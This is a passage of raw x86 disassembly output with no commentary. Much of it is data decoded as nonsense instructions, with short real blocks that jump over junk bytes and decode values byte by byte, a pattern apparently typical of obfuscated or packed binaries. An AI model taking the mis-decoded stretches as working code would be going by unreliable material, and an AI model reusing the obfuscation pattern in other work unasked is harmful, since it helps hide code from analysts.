  4065f5:	js     0x406588
  4065f7:	and    eax,0x2ca1ea58
  4065fc:	jmp    0xe98e:0x3585c2f2
  406603:	fwait
  406604:	inc    ebx
  406605:	xchg   BYTE PTR [edx-0x5e],ch
  406608:	int    0x3b
  40660a:	cmc    
  40660b:	pop    es
  40660c:	cmc    
  40660d:	in     al,0x4a
  40660f:	lods   eax,DWORD PTR ds:[esi]
  406610:	jb     0x40659f
  406612:	mov    dh,0x0
  406614:	cwde   
  406615:	sbb    al,0x94
  406617:	xchg   DWORD PTR [esi+0x7862b97d],esp
  40661d:	and    DWORD PTR [ebp+edi*2-0x6863a319],edi
  406624:	dec    ebp
  406625:	fld    DWORD PTR [edx+0x617da5f1]
  40662b:	retf   
  40662c:	pop    es
  40662d:	mov    edi,0x6cc6b5d4
  406632:	loop   0x406666
  406634:	adc    ch,BYTE PTR [ecx+0x5a]
  406637:	scas   al,BYTE PTR es:[edi]
  406638:	dec    esp
  406639:	(bad)  
  40663a:	leave  
  40663b:	mov    esi,0x64036731
  406640:	ins    DWORD PTR es:[edi],dx
  406641:	test   BYTE PTR [edx+0x36],dh
  406644:	mov    DWORD PTR ds:0x3e70d185,eax
  40664a:	fidiv  WORD PTR [edx]
  40664c:	adc    eax,0xe85de17a
  406651:	clc    
  406652:	in     eax,0xee
  406654:	cmp    DWORD PTR [esi+eiz*4-0x5],0x1e
  406659:	pop    ss
  40665a:	stos   DWORD PTR es:[edi],eax
  40665b:	dec    ebx
  40665c:	pop    esi
  40665d:	pop    es
  40665e:	pop    es
  40665f:	mov    bl,0x77
  406661:	sub    eax,0x3aad3601
  406666:	fwait
  406667:	and    bh,ch
  406669:	test   eax,0x270a85dd
  40666e:	push   ebp
  40666f:	push   esp
  406670:	sub    al,0x27
  406672:	sbb    al,0xe9
  406674:	dec    edi
  406675:	mov    edx,esp
  406677:	lar    edx,WORD PTR [edx-0x59807d85]
  40667e:	jae    0x406636
  406680:	js     0x406701
  406682:	fstp   TBYTE PTR [eax+0x7f90f929]
  406688:	mov    esi,ds
  40668a:	jns    0x4066ec
  40668c:	psubusb mm7,mm7
  40668f:	out    0x12,al
  406691:	jne    0x406639
  406693:	scas   al,BYTE PTR es:[edi]
  406694:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406695:	cs (bad) 
  406697:	dec    esi
  406699:	adc    al,0x86
  40669b:	xor    eax,0x6b28230e
  4066a0:	fldenv [edi+0x22]
  4066a3:	adc    ebx,DWORD PTR [edx-0x8]
  4066a6:	cmp    cl,BYTE PTR [esi+ebx*2-0x13]
  4066aa:	mov    BYTE PTR [ecx+edx*1],0x9
  4066ae:	jns    0x4066f4
  4066b0:	lock mov DWORD PTR [ecx-0x41],ebx
  4066b4:	arpl   sp,si
  4066b6:	push   ds
  4066b7:	das    
  4066b8:	imul   eax,ebp,0xd74b9024
  4066be:	loope  0x4066ec
  4066c0:	cmp    al,0x98
  4066c2:	xchg   ecx,eax
  4066c3:	xchg   ebx,eax
  4066c4:	xor    bl,dl
  4066c6:	cwde   
  4066c7:	sub    DWORD PTR [eax+ecx*1+0x290ba4fe],esi
  4066ce:	dec    esi
  4066cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066d0:	int3   
  4066d1:	inc    di
  4066d3:	mov    DWORD PTR [edx+esi*2+0x4f121920],0x64d095d3
  4066de:	into   
  4066df:	test   DWORD PTR [edi-0x48766213],ecx
  4066e5:	scas   al,BYTE PTR es:[edi]
  4066e6:	add    al,0xfe
  4066e8:	cdq    
  4066e9:	mov    WORD PTR [eax+0x0],ds
  4066ec:	dec    edi
  4066ed:	les    ebx,FWORD PTR [edx]
  4066ef:	mov    dh,0xbe
  4066f1:	les    esi,FWORD PTR [ecx+0x57]
  4066f4:	mov    edx,0xf71fa5eb
  4066f9:	(bad)  
  4066fa:	and    ah,BYTE PTR [esi+0x4f3b9f3a]
  406700:	sbb    eax,0xfa4e03d6
  406705:	ficom  WORD PTR [edx+0x1d5da752]
  40670b:	dec    esp
  40670c:	mov    esi,0x49199418
  406711:	xlat   BYTE PTR ds:[ebx]
  406712:	int    0xbf
  406714:	pop    edi
  406715:	adc    bl,al
  406717:	sub    eax,0x98db61c2
  40671c:	mov    esi,0x50ad859a
  406721:	sahf   
  406722:	and    al,0xca
  406724:	les    edi,FWORD PTR [esi+ebx*1-0x66]
  406728:	mov    ds:0xb39ce8a4,al
  40672d:	addr16 cmc 
  40672f:	stos   BYTE PTR es:[edi],al
  406730:	rcl    bl,cl
  406732:	fist   DWORD PTR [esi+0x41]
  406735:	mov    ds,WORD PTR [edi]
  406737:	adc    DWORD PTR [ebp+eiz*2+0x46aa9cea],esi
  40673e:	ins    BYTE PTR es:[edi],dx
  40673f:	xor    DWORD PTR [edx],0x0
  406742:	stos   DWORD PTR es:[edi],eax
  406743:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406744:	fdivrp st(6),st
  406746:	push   esi
  406747:	(bad)  
  406748:	mov    dh,0x1f
  40674a:	loope  0x406701
  40674c:	mov    BYTE PTR [ebx+0x73],dl
  40674f:	or     al,0xd8
  406751:	mov    WORD PTR [ebx],gs
  406753:	or     DWORD PTR [esi-0x24c3866d],ecx
  406759:	jae    0x406778
  40675b:	pop    edi
  40675c:	not    bl
  40675e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40675f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406760:	aad    0xb2
  406762:	mov    DWORD PTR [esp+ebp*8],ebp
  406765:	in     eax,0xec
  406767:	xor    eax,0xe2924d69
  40676c:	jb     0x406779
  40676e:	sbb    al,0x41
  406770:	les    esp,FWORD PTR [esp+ebp*1+0x11]
  406774:	or     BYTE PTR [edx-0xadac2ab],0xbf
  40677b:	retf   0xb563
  40677e:	xor    eax,DWORD PTR [eax+0x2d7d8e76]
  406784:	mov    BYTE PTR ds:[eax],dl
  406787:	pop    ss
  406788:	js     0x40674d
  40678a:	aad    0x98
  40678c:	(bad)  
  40678d:	in     eax,dx
  40678e:	es int3 
  406790:	imul   edi,edx,0xffffffea
  406793:	mov    WORD PTR [ecx+0x1f8be1df],cs
  406799:	lea    ebx,[ecx]
  40679b:	push   0x5b63117f
  4067a0:	and    edi,edi
  4067a2:	cli    
  4067a3:	sbb    BYTE PTR [ebx+0x8da1f5],bl
  4067a9:	or     ebp,DWORD PTR [eax+0x79]
  4067ac:	lods   al,BYTE PTR ds:[esi]
  4067ad:	loop   0x406818
  4067af:	sahf   
  4067b0:	gs lahf 
  4067b2:	mov    al,BYTE PTR [eax+0x4a]
  4067b5:	cmc    
  4067b6:	pop    ebp
  4067b7:	cmp    BYTE PTR [eax-0x63],0x4e
  4067bb:	rol    BYTE PTR [edi-0x1f],cl
  4067be:	mov    edi,0x237a03a6
  4067c3:	and    al,BYTE PTR [ebx+0x5c]
  4067c6:	or     BYTE PTR [edi-0x16e31ee1],ah
  4067cc:	mov    eax,ds:0x4d1e502
  4067d1:	jp     0x406823
  4067d3:	fcom   DWORD PTR [ebx+ebp*2+0x3480c525]
  4067da:	jle    0x406777
  4067dc:	aaa    
  4067dd:	and    BYTE PTR [edx],bh
  4067df:	aas    
  4067e0:	mov    cl,0xde
  4067e2:	cmp    al,0xf4
  4067e4:	cmp    eax,DWORD PTR [esp+esi*1]
  4067e7:	sub    eax,0x385fc037
  4067ec:	int    0x53
  4067ee:	jbe    0x406865
  4067f0:	lock inc eax
  4067f2:	pop    edx
  4067f3:	jecxz  0x4067d3
  4067f5:	pop    eax
  4067f6:	loopne 0x4067c2
  4067f8:	fldenv [ebx-0x301a0702]
  4067fe:	pop    edx
  4067ff:	je     0x406864
  406801:	and    bh,BYTE PTR [esi]
  406803:	sahf   
  406804:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406805:	inc    eax
  406806:	adc    al,0x41
  406808:	push   esi
  406809:	mov    ds:0x3ec3883b,eax
  40680e:	adc    DWORD PTR [esi-0x5c],0x9
  406812:	aad    0x65
  406814:	dec    edx
  406815:	fs scas al,BYTE PTR es:[edi]
  406817:	test   eax,0x5ae9b3bf
  40681c:	mov    ebp,0x1adbd24a
  406821:	mov    al,0x19
  406823:	retf   
  406824:	int    0x1e
  406826:	out    dx,al
  406827:	inc    esp
  406828:	test   DWORD PTR [ecx+0x6d7322e5],ecx
  40682e:	or     eax,0xb2f79446
  406833:	mov    dl,0x65
  406835:	je     0x4067de
  406837:	in     al,0x5c
  406839:	loop   0x40682a
  40683b:	or     eax,0x8c4b2db2
  406840:	std    
  406841:	dec    esi
  406842:	mov    BYTE PTR [edi*1-0x32f9fb9c],bh
  406849:	call   0xa6a7e6e
  40684e:	cld    
  40684f:	in     eax,0x91
  406851:	out    dx,al
  406852:	lahf   
  406853:	pusha  
  406854:	mov    dl,BYTE PTR [edi]
  406856:	or     DWORD PTR [eax+0x3b],eax
  406859:	sub    dh,ch
  40685b:	enter  0xf59e,0x51
  40685f:	mov    dl,0x6a
  406861:	jmp    0xbff199e4
  406866:	mov    ebp,0x199d9834
  40686b:	in     al,0xa8
  40686d:	daa    
  40686e:	adc    BYTE PTR [eax+0x63bf4ae],cl
  406874:	inc    ebx
  406875:	and    ch,BYTE PTR [edx]
  406877:	inc    eax
  406878:	sahf   
  406879:	cld    
  40687a:	dec    eax
  40687b:	adc    BYTE PTR [ecx],bh
  40687d:	ficom  DWORD PTR [ecx+0x3b]
  406880:	(bad)  
  406882:	sbb    bl,BYTE PTR [edx+0x55]
  406885:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406886:	retf   0x91f3
  406889:	(bad)  
  40688a:	repz mov esi,0x37f7dadf
  406890:	adc    ch,bh
  406892:	cmp    eax,DWORD PTR [ecx+0x683145ad]
  406898:	dec    ecx
  406899:	mov    BYTE PTR [ebp+0x2d],ah
  40689c:	outs   dx,DWORD PTR ds:[esi]
  40689d:	inc    ecx
  40689e:	push   ebx
  40689f:	sbb    bh,bl
  4068a1:	cdq    
  4068a2:	in     al,dx
  4068a3:	mov    eax,0xe7f56a3d
  4068a8:	and    DWORD PTR ds:[edi+0x58],esp
  4068ac:	inc    eax
  4068ad:	out    dx,al
  4068ae:	or     eax,0x938e33c7
  4068b3:	imul   ebx,DWORD PTR [ecx+0xf],0x4812c9bb
  4068ba:	inc    eax
  4068bb:	jno    0x406914
  4068bd:	jo     0x4068cc
  4068bf:	xchg   ebp,eax
  4068c0:	mov    esp,0x9921c571
  4068c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068c6:	aad    0xe
  4068c8:	pop    ecx
  4068c9:	cld    
  4068ca:	out    0x96,eax
  4068cc:	fs ins DWORD PTR es:[edi],dx
  4068ce:	xor    al,0xe9
  4068d0:	xchg   DWORD PTR [ebx],esp
  4068d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068d3:	outs   dx,DWORD PTR ds:[esi]
  4068d4:	jo     0x406924
  4068d6:	mov    al,0x85
  4068d8:	push   0xd5e39ef8
  4068dd:	cmp    DWORD PTR [ebx-0x3c45df3d],ebx
  4068e3:	enter  0xf20f,0xe
  4068e7:	pop    esp
  4068e8:	clc    
  4068e9:	push   ds
  4068ea:	fiadd  DWORD PTR [eax+0x274d4f84]
  4068f0:	addr16 jg 0x406959
  4068f3:	add    esp,0x5f2b6bb8
  4068f9:	(bad)  
  4068fa:	adc    DWORD PTR [edx],ecx
  4068fc:	les    ecx,FWORD PTR [ecx]
  4068fe:	ficomp WORD PTR ds:0xb57261a4
  406904:	mov    edi,0xd397e412
  406909:	enter  0xcaf9,0x1e
  40690d:	out    0x38,eax
  40690f:	scas   eax,DWORD PTR es:[edi]
  406910:	xchg   ecx,eax
  406911:	daa    
  406912:	and    bl,BYTE PTR [edx-0x3e263b65]
  406918:	loope  0x406938
  40691a:	mov    ecx,DWORD PTR [ebp-0x14]
  40691d:	xor    eax,edi
  40691f:	xor    edx,edx
  406921:	or     eax,edx
  406923:	mov    cl,BYTE PTR [eax+ecx*1]
  406926:	mov    eax,DWORD PTR [ebp-0x34]
  406929:	or     BYTE PTR [eax],cl
  40692b:	mov    eax,DWORD PTR [ebp-0x10]
  40692e:	mov    ecx,DWORD PTR [ebp-0xc]
  406931:	shrd   eax,ecx,0x2
  406935:	shr    ecx,0x2
  406938:	mov    ecx,DWORD PTR [ebp-0x10]
  40693b:	mov    edx,DWORD PTR [ebp-0xc]
  40693e:	xor    eax,edi
  406940:	shl    ecx,0x1e
  406943:	xor    edx,edx
  406945:	or     eax,edx
  406947:	lea    eax,[ebp+eax*1-0x4]
  40694b:	mov    DWORD PTR [ebp-0x34],eax
  40694e:	mov    eax,DWORD PTR [ebp-0x10]
  406951:	mov    ecx,DWORD PTR [ebp-0xc]
  406954:	shrd   eax,ecx,0x2
  406958:	shr    ecx,0x2
  40695b:	mov    ecx,DWORD PTR [ebp-0x10]
  40695e:	mov    edx,DWORD PTR [ebp-0xc]
  406961:	xor    eax,edi
  406963:	jmp    0x406d41
  406968:	arpl   WORD PTR [eax],di
  40696a:	test   eax,0x2284a205
  40696f:	ss xchg esp,eax
  406971:	scas   al,BYTE PTR es:[edi]
  406972:	addr16 mov esp,0xb07f28da
  406978:	test   DWORD PTR [ebx+0x129e1818],edx
  40697e:	sbb    BYTE PTR [eax],bl
  406980:	js     0x4069a3
  406982:	mov    bh,0x2f
  406984:	pop    esi
  406985:	jle    0x4069cd
  406987:	cwde   
  406988:	es adc al,0xb8
  40698b:	mov    cl,BYTE PTR [eax-0x5e]
  40698e:	mov    edx,DWORD PTR [edi-0x1784419f]
  406994:	sub    al,0xbc
  406996:	sub    bh,0xe2
  406999:	cmp    eax,0x3da8ad30
  40699e:	adc    eax,0x179c36e9
  4069a3:	mov    ecx,DWORD PTR [edi-0x4]
  4069a6:	icebp  
  4069a7:	test   eax,0x835d79e0
  4069ac:	out    0x17,al
  4069ae:	test   BYTE PTR [ebp+0x32c8898],ah
  4069b4:	pop    esp
  4069b5:	clc    
  4069b6:	clc    
  4069b7:	mov    esi,0x488edde7
  4069bc:	add    ebx,DWORD PTR [edx]
  4069be:	mov    dl,0xd4
  4069c0:	mov    ds:0xb218793b,eax
  4069c5:	mov    ecx,DWORD PTR [ebx]
  4069c7:	enter  0x59ac,0xf
  4069cb:	loope  0x406a01
  4069cd:	xchg   ecx,eax
  4069ce:	pop    ebp
  4069cf:	push   edi
  4069d0:	pop    ebx
  4069d1:	int    0x7a
  4069d3:	out    dx,eax
  4069d4:	xchg   BYTE PTR [ebx],ah
  4069d6:	jmp    0x8436f62a
  4069db:	data16 mov BYTE PTR [ebp-0x7f70b353],dl
  4069e2:	rol    BYTE PTR [ebx-0x372f3df7],cl
  4069e8:	fcom   QWORD PTR [ebx+0x40f86ba5]
  4069ee:	adc    eax,DWORD PTR [ebx-0x37bae8df]
  4069f4:	(bad)  
  4069f6:	fadd   DWORD PTR [esi+esi*1-0xb12692d]
  4069fd:	sbb    al,0x44
  4069ff:	sbb    esi,eax
  406a01:	push   ss
  406a02:	not    BYTE PTR [edi+edx*4+0x1d8442fb]
  406a09:	loope  0x406a55
  406a0b:	cmp    eax,0x82bed009
  406a10:	out    0x40,eax
  406a12:	cs scas eax,DWORD PTR es:[edi]
  406a14:	stc    
  406a15:	pusha  
  406a16:	ins    BYTE PTR es:[edi],dx
  406a17:	mov    fs,ebx
  406a19:	fist   WORD PTR [edi]
  406a1b:	xor    BYTE PTR [eax-0x3a764737],cl
  406a21:	sub    BYTE PTR [eax+esi*2+0x1891fcf5],bh
  406a28:	(bad)  
  406a2a:	or     al,0xbb
  406a2c:	hlt    
  406a2d:	xchg   ebx,eax
  406a2e:	icebp  
  406a2f:	fistp  WORD PTR [ecx-0x23]
  406a32:	cmp    cl,BYTE PTR [ebx]
  406a34:	add    BYTE PTR [edx+0x1023a2db],0xf2
  406a3b:	fst    QWORD PTR [ecx-0x5dbd333b]
  406a41:	cmp    bl,BYTE PTR [ecx+0x48]
  406a44:	cld    
  406a45:	push   eax
  406a46:	pop    esp
  406a47:	mov    eax,ds:0xd460b0f7
  406a4c:	es and esi,esi
  406a4f:	inc    edx
  406a50:	clc    
  406a51:	(bad)  
  406a52:	mov    eax,ds:0x79440713
  406a57:	clc    
  406a58:	cmp    dh,cl
  406a5a:	imul   esi,DWORD PTR [ebx-0x4],0x5012459b
  406a61:	fidivr WORD PTR [esi-0x29]
  406a64:	push   0xc45e472c
  406a69:	and    al,0x9b
  406a6b:	outs   dx,BYTE PTR ds:[esi]
  406a6c:	xchg   edi,eax
  406a6d:	cli    
  406a6e:	ja     0x406a68
  406a70:	int3   
  406a71:	iret   
  406a72:	and    DWORD PTR [ebx+0x6c],esp
  406a75:	push   ecx
  406a76:	cs jo  0x406a5a
  406a79:	sub    dl,BYTE PTR [esi]
  406a7b:	test   BYTE PTR [esp+ebx*4],0x12
  406a7f:	mov    ds:0x65dd22d5,al
  406a84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a85:	div    DWORD PTR [edi]
  406a87:	pop    eax
  406a88:	pusha  
  406a89:	addr16 retf 
  406a8b:	xor    edx,DWORD PTR [edi-0x14]
  406a8e:	jno    0x406ac6
  406a90:	jle    0x406acf
  406a92:	scas   eax,DWORD PTR es:[edi]
  406a93:	fst    DWORD PTR [eax]
  406a95:	movups xmm6,xmm2
  406a98:	daa    
  406a99:	push   ecx
  406a9a:	xor    al,0xaf
  406a9c:	jecxz  0x406a25
  406a9e:	not    DWORD PTR [edx-0x138e0b18]
  406aa4:	call   0x7bd6474f
  406aa9:	jg     0x406b1f
  406aab:	mov    ch,0x2e
  406aad:	or     eax,0x6c2dcd4c
  406ab2:	cmp    dh,BYTE PTR [ecx+0x54]
  406ab5:	sub    cl,BYTE PTR [edx+eiz*4-0x5a5ecee8]
  406abc:	hlt    
  406abd:	mov    ebp,ebx
  406abf:	dec    edi
  406ac0:	mov    ebp,0xb0e884ec
  406ac5:	xor    BYTE PTR [edx-0x4db9545b],ah
  406acb:	mov    BYTE PTR [ecx],0x65
  406ace:	das    
  406acf:	adc    DWORD PTR [esi+ebx*4],eax
  406ad2:	jecxz  0x406a79
  406ad4:	dec    ebp
  406ad5:	sbb    DWORD PTR [edx],0xe51e5e79
  406adb:	jge    0x406a6d
  406add:	jns    0x406a6c
  406adf:	imul   BYTE PTR [ecx-0x6e]
  406ae2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ae3:	jne    0x406b0c
  406ae5:	das    
  406ae6:	jmp    DWORD PTR [ebx+ecx*4+0x26618f69]
  406aed:	push   ss
  406aee:	shr    bl,0xf2
  406af1:	jno    0x406a92
  406af3:	fst    DWORD PTR [ebx]
  406af5:	jp     0x406aba
  406af7:	dec    ebp
  406af8:	scas   al,BYTE PTR es:[edi]
  406af9:	mov    ch,0x3c
  406afb:	jp     0x406b59
  406afd:	inc    esi
  406afe:	xchg   esi,eax
  406aff:	not    cl
  406b01:	jae    0x406b6e
  406b03:	or     al,0x24
  406b05:	outs   dx,DWORD PTR ds:[esi]
  406b06:	jns    0x406b6e
  406b08:	xchg   esi,eax
  406b09:	pop    ebp
  406b0a:	call   0x22b56384
  406b0f:	cmp    dl,BYTE PTR [esi-0xa]
  406b12:	bound  edi,QWORD PTR [edi]
  406b14:	adc    esi,eax
  406b16:	sub    al,BYTE PTR [edx]
  406b18:	sub    DWORD PTR [esi+ecx*4-0x56],edx
  406b1c:	jg     0x406b72
  406b1e:	cdq    
  406b1f:	shl    DWORD PTR [edx+0x6c],0x88
  406b23:	outs   dx,DWORD PTR ds:[esi]
  406b24:	dec    ebx
  406b25:	mov    bl,0xaf
  406b27:	add    bl,BYTE PTR [edi-0x24]
  406b2a:	jp     0x406b7d
  406b2c:	xchg   esp,eax
  406b2d:	sahf   
  406b2e:	out    dx,al
  406b2f:	push   edx
  406b30:	mov    al,ds:0x385132c0
  406b35:	into   
  406b36:	dec    ebx
  406b37:	sub    DWORD PTR [edx-0x2602c85c],edx
  406b3d:	add    edx,DWORD PTR [edx]
  406b3f:	jnp    0x406ac3
  406b41:	data16 ja 0x406b5e
  406b44:	call   0x52f6:0x6da85f8f
  406b4b:	add    eax,0xd65071c5
  406b50:	nop
  406b51:	arpl   WORD PTR [esi-0x6f970dd8],si
  406b57:	mov    edx,0x498ec977
  406b5c:	pop    ebx
  406b5d:	fs lock inc ebx
  406b60:	mov    dl,0x52
  406b62:	in     al,dx
  406b63:	cwde   
  406b64:	mov    WORD PTR ds:0xe730649e,0x5030
  406b6d:	dec    esi
  406b6e:	sar    ebp,0x1a
  406b71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b72:	add    DWORD PTR [eax+0x2b2140a6],esi
  406b78:	shl    ebx,1
  406b7a:	inc    esi
  406b7b:	mov    esp,0xccf41f33
  406b80:	div    DWORD PTR [edi-0x6de02716]
  406b86:	inc    edx
  406b87:	stos   BYTE PTR es:[edi],al
  406b88:	in     eax,0x41
  406b8a:	or     DWORD PTR [edi+0x3d],ecx
  406b8d:	jbe    0x406bd6
  406b8f:	fnstsw WORD PTR [eax+0x50]
  406b92:	aas    
  406b93:	cmp    eax,0xc1909549
  406b98:	fs inc ecx
  406b9a:	push   0xffffff8e
  406b9c:	in     eax,0x9e
  406b9e:	cmc    
  406b9f:	repz mov dh,BYTE PTR [ecx-0x79]
  406ba3:	retf   0x5058
  406ba6:	jl     0x406c0a
  406ba8:	sub    BYTE PTR [ecx+0x55b7ff14],cl
  406bae:	inc    ecx
  406baf:	pop    esi
  406bb0:	xchg   esp,eax
  406bb1:	(bad)  
  406bb2:	inc    edi
  406bb3:	mov    ax,ds:0x326fbf40
  406bb9:	sbb    BYTE PTR [ecx-0x69da9623],0x6f
  406bc0:	xchg   BYTE PTR [ebx-0xc234e6b],bl
  406bc6:	dec    edx
  406bc7:	mov    ebp,0xebaef7f4
  406bcc:	inc    ebp
  406bcd:	or     eax,DWORD PTR [ecx+0x2]
  406bd0:	xchg   edx,eax
  406bd1:	push   ebx
  406bd2:	jp     0x406b5e
  406bd4:	outs   dx,DWORD PTR ds:[esi]
  406bd5:	scas   eax,DWORD PTR es:[edi]
  406bd6:	mov    eax,ds:0x23a15ece
  406bdb:	push   ds
  406bdc:	xchg   ebp,eax
  406bdd:	rol    BYTE PTR [ecx-0x1ce97c1e],cl
  406be3:	es mov ecx,0x5df57e01
  406be9:	and    cl,BYTE PTR [edi]
  406beb:	pop    ecx
  406bec:	icebp  
  406bed:	xchg   ecx,eax
  406bee:	(bad)  
  406bef:	adc    BYTE PTR [eax+0x8],dl
  406bf2:	fist   DWORD PTR [esp+edx*4+0x5]
  406bf6:	cwde   
  406bf7:	popf   
  406bf8:	mov    ds:0x77b7def8,eax
  406bfd:	fcmovbe st,st(2)
  406bff:	push   edi
  406c00:	push   ss
  406c01:	mov    esp,DWORD PTR [edi]
  406c03:	xor    DWORD PTR [ecx],esi
  406c05:	and    al,0x4d
  406c07:	jle    0x406c78
  406c09:	or     edx,DWORD PTR [ebx+0x4f63204d]
  406c0f:	imul   ebp,ebx,0x4aeed40
  406c15:	inc    esp
  406c16:	repnz pop es
  406c18:	fs pop ebp
  406c1a:	fsubr  st(0),st
  406c1c:	or     esp,DWORD PTR [ecx+eax*2-0x2411dc2e]
  406c23:	enter  0x3ceb,0xbc
  406c27:	loopne 0x406bdf
  406c29:	icebp  
  406c2a:	ins    DWORD PTR es:[edi],dx
  406c2b:	cmp    edx,eax
  406c2d:	sub    eax,0x6de81f54
  406c32:	cmc    
  406c33:	dec    esi
  406c34:	sub    ah,bl
  406c36:	pop    edx
  406c37:	push   ebx
  406c38:	(bad)  
  406c39:	fistp  DWORD PTR [ebx]
  406c3b:	leave  
  406c3c:	or     al,0x7b
  406c3e:	dec    edx
  406c3f:	imul   ebp,DWORD PTR [edx],0x7f756d96
  406c45:	xor    eax,0xf4588cf8
  406c4a:	adc    ch,cl
  406c4c:	or     ecx,DWORD PTR [ebx+0x2e902cc4]
  406c52:	rol    DWORD PTR [ecx-0x22],0x65
  406c56:	cdq    
  406c57:	jo     0x406c51
  406c59:	adc    DWORD PTR [eax+ebp*2-0x3],ebp
  406c5d:	or     ebp,ecx
  406c5f:	inc    ebx
  406c60:	jp     0x406c4b
  406c62:	ins    DWORD PTR es:[edi],dx
  406c63:	adc    DWORD PTR [ebx],ebx
  406c65:	or     eax,0x3c963966
  406c6a:	xor    al,0x73
  406c6c:	and    bl,al
  406c6e:	xor    bh,bh
  406c70:	mov    esp,0xcb2a7e52
  406c75:	call   DWORD PTR [edx]
  406c77:	sar    ecx,cl
  406c79:	cli    
  406c7a:	pop    ebx
  406c7b:	iret   
  406c7c:	test   eax,0xd262d779
  406c81:	pop    ds
  406c82:	cld    
  406c83:	shr    DWORD PTR [ebx],1
  406c85:	pop    es
  406c86:	cli    
  406c87:	scas   eax,DWORD PTR es:[edi]
  406c88:	or     BYTE PTR [edi+edx*1],al
  406c8b:	sbb    al,0xed
  406c8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c8e:	cmp    al,0x63
  406c90:	cs (bad) 
  406c92:	icebp  
  406c93:	push   esp
  406c94:	aam    0x73
  406c96:	fldenv [eax-0x7601ea52]
  406c9c:	or     BYTE PTR [ebp+0x69],bl
  406c9f:	mov    edx,0x7f083f98
  406ca4:	(bad)  
  406ca5:	lea    ecx,[edi+0x2cba4e87]
  406cab:	mov    esi,0x6846438d
  406cb0:	fmul   DWORD PTR [ebp+ecx*4-0x11]
  406cb5:	jmp    0x817d:0xca815cac
  406cbc:	sub    dl,BYTE PTR [edi-0x76]
  406cbf:	fdivr  QWORD PTR [eax+ebx*4+0x27]
  406cc3:	jecxz  0x406d38
  406cc5:	shr    DWORD PTR [ebx+0x2d],0xd5
  406cc9:	nop
  406cca:	dec    edx
  406ccb:	aaa    
  406ccc:	sbb    eax,esi
  406cce:	lea    esp,[eax]
  406cd0:	and    DWORD PTR [esi-0x48a1cc6a],ebx
  406cd6:	xchg   BYTE PTR [edx+edx*1],dh
  406cd9:	test   al,0xeb
  406cdb:	push   ds
  406cdc:	not    BYTE PTR [edi+0x71]
  406cdf:	imul   DWORD PTR [edx+eax*2]
  406ce2:	rol    BYTE PTR [esi],cl
  406ce4:	pusha  
  406ce5:	mov    bh,0x8a
  406ce7:	scas   al,BYTE PTR es:[edi]
  406ce8:	fcmovu st,st(4)
  406ceb:	push   0x4b
  406ced:	in     eax,0x87
  406cef:	popa   
  406cf0:	adc    eax,0x8460afa8
  406cf5:	pop    ebp
  406cf6:	outs   dx,DWORD PTR ds:[esi]
  406cf7:	fbld   TBYTE PTR [esi-0x12]
  406cfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cfc:	dec    ebp
  406cfd:	and    al,0xa7
  406cff:	bound  ebp,QWORD PTR [eax]
  406d01:	test   DWORD PTR [edx-0x31c06435],0x6de49586
  406d0b:	(bad)  
  406d0c:	sbb    DWORD PTR [edi+esi*8+0x2a918b8e],ebx
  406d13:	and    BYTE PTR [ebp+0x423c0c5f],dh
  406d19:	retf   
  406d1a:	clc    
  406d1b:	call   0xc48b:0x4049f7b5
  406d22:	jl     0x406cf7
  406d24:	jmp    0x406cdb
  406d26:	sahf   
  406d27:	push   edx
  406d28:	in     al,0x8b
  406d2a:	sbb    cl,BYTE PTR [esi*8+0x4ecf306e]
  406d31:	inc    esi
  406d32:	out    dx,al
  406d33:	fadd   QWORD PTR [edx]
  406d35:	adc    eax,0xb8bea36c
  406d3a:	(bad)  
  406d3b:	xchg   ecx,eax
  406d3c:	dec    edi
  406d3d:	in     al,0xba
  406d3f:	std    
  406d40:	cmp    ecx,eax
  406d42:	loope  0x406d62
  406d44:	mov    ecx,DWORD PTR [ebp-0x14]
  406d47:	xor    edx,edx
  406d49:	or     eax,edx
  406d4b:	mov    cl,BYTE PTR [eax+ecx*1]
  406d4e:	mov    eax,DWORD PTR [ebp-0x34]
  406d51:	add    BYTE PTR [eax],cl
  406d53:	mov    eax,DWORD PTR [ebp-0x60]
  406d56:	mov    ecx,DWORD PTR [ebp-0x5c]
  406d59:	shrd   eax,ecx,0x2
  406d5d:	shr    ecx,0x2
  406d60:	mov    ecx,DWORD PTR [ebp-0x60]
  406d63:	mov    edx,DWORD PTR [ebp-0x5c]
  406d66:	xor    eax,edi
  406d68:	xor    edx,edx
  406d6a:	or     eax,edx
  406d6c:	lea    eax,[ebp+eax*1-0x4]
  406d70:	mov    DWORD PTR [ebp-0x34],eax
  406d73:	mov    eax,DWORD PTR [ebp-0x60]
  406d76:	shl    ecx,0x1e
  406d79:	mov    ecx,DWORD PTR [ebp-0x5c]
  406d7c:	shrd   eax,ecx,0x2
  406d80:	shr    ecx,0x2
  406d83:	mov    ecx,DWORD PTR [ebp-0x60]
  406d86:	mov    edx,DWORD PTR [ebp-0x5c]
  406d89:	xor    eax,edi
  406d8b:	xor    edx,edx
  406d8d:	or     eax,edx
  406d8f:	mov    edx,DWORD PTR [ebp+0x14]
  406d92:	shl    ecx,0x1e
  406d95:	mov    ecx,DWORD PTR [ebp-0x14]
  406d98:	mov    cl,BYTE PTR [eax+ecx*1]
  406d9b:	mov    eax,DWORD PTR [ebp-0x34]
  406d9e:	or     BYTE PTR [eax],cl
  406da0:	mov    eax,DWORD PTR [ebp+0x10]
  406da3:	jmp    0x407181
  406da8:	fcmovnb st,st(6)
  406daa:	int3   
  406dab:	xchg   edi,eax
  406dac:	lods   al,BYTE PTR ds:[esi]
  406dad:	jnp    0x406dc9
  406daf:	sbb    cl,BYTE PTR [edi+0x716a0603]
  406db5:	or     al,0x29
  406db7:	stos   BYTE PTR es:[edi],al
  406db8:	or     cl,BYTE PTR [ebx+0x129e1818]
